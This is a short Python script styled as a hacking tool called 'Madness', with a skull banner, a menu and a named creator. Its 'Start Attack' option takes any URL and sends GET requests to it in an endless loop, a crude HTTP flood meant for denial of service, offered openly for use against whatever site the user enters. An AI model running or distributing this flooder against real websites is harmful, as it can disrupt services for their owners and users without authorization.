import requests
import pyfiglet
from colorama import Fore
import time
icon = '''
     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
     ⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿
     ⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿
     ⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿
     ⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿
     ⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿
     ⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿
     ⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿
     ⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿
     ⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿
     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
'''
print(Fore.GREEN + icon)
print(Fore.GREEN + pyfiglet.figlet_format("Madness"))
print(Fore.GREEN + "v0.1")
menu = '''
|-----------------------------|
| [1] Start Attack [2] Creator|
|-----------------------------|
'''
def attack():
	while True:
		response = requests.get(url)
		print(response)
print(Fore.GREEN + menu)
choice = input(Fore.GREEN + "[?] Your choice: ")
if choice == "1":
	url = input("Enter URL for attack: ")
	print("Now you will see a lot of strange messages, don't be alarmed, this is normal.")
	time.sleep(1)
	attack()
elif choice == "2":
	print("Creator: ImHacker890-890")
